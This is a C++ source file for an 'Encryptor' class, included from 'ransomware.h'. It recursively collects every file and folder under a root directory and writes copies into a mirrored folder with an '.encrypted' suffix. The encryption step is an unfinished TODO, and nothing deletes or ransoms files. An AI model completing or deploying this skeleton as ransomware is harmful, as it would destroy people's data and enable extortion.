#include "ransomware.h"

#include <iostream>
#include <filesystem>
#include <exception>
#include <vector>

#include <fmt/format.h>

Encryptor::Encryptor(std::filesystem::path const &rootPath)
    : rootPath_(rootPath)
{
    auto rootEntry = std::filesystem::directory_entry(rootPath);
    if (!rootEntry.is_directory()) {
        throw std::runtime_error(fmt::format("{} is not a directory", std::filesystem::absolute(rootPath).string()));
    }

    encryptedDir_ = rootPath;
    encryptedDir_ /= std::filesystem::path(ENCRYPTED_DIR_NAME);
    std::cout << fmt::format("Encrypted dir path: {}\n", encryptedDir_.string());

    if (std::filesystem::exists(encryptedDir_)) {
        throw std::runtime_error(fmt::format("{} already exists", std::filesystem::absolute(encryptedDir_).string()));
    }

    ProcessDirectory(rootEntry);

    for (auto &file : regularFiles_) {
        std::cout << fmt::format("Found regular file for encryption: {}\n", file.string());
    }

    std::filesystem::create_directory(encryptedDir_);
    for (auto &dir : directories_) {
        auto path = encryptedDir_;
        path /= dir.lexically_relative(rootPath);
        std::filesystem::create_directory(path);
    }
}

void Encryptor::ProcessDirectory(const std::filesystem::directory_entry &rootEntry)
{
    for (auto &e : std::filesystem::recursive_directory_iterator(rootEntry)) {
        if (e.is_regular_file()) {
            regularFiles_.emplace_back(e.path());
        } else if (e.is_directory()) {
            directories_.emplace_back(e.path());
        }
    }
}

void Encryptor::Encrypt()
{
    for (auto &filePath : regularFiles_) {
        EncryptRegularFile(filePath);
    }

    std::cout << "Encryption finished\n";
}

void Encryptor::EncryptRegularFile(std::filesystem::path const &filePath)
{
    std::cout << fmt::format("Processing regular file: {}\n", filePath.string());
    auto encryptedPath = encryptedDir_;
    encryptedPath /= filePath.lexically_relative(rootPath_);
    encryptedPath += ".encrypted";

    // TODO: actually encrypt
    std::filesystem::copy(filePath, encryptedPath);

    std::cout << fmt::format("Encrypted to: {}\n", encryptedPath.string());
}
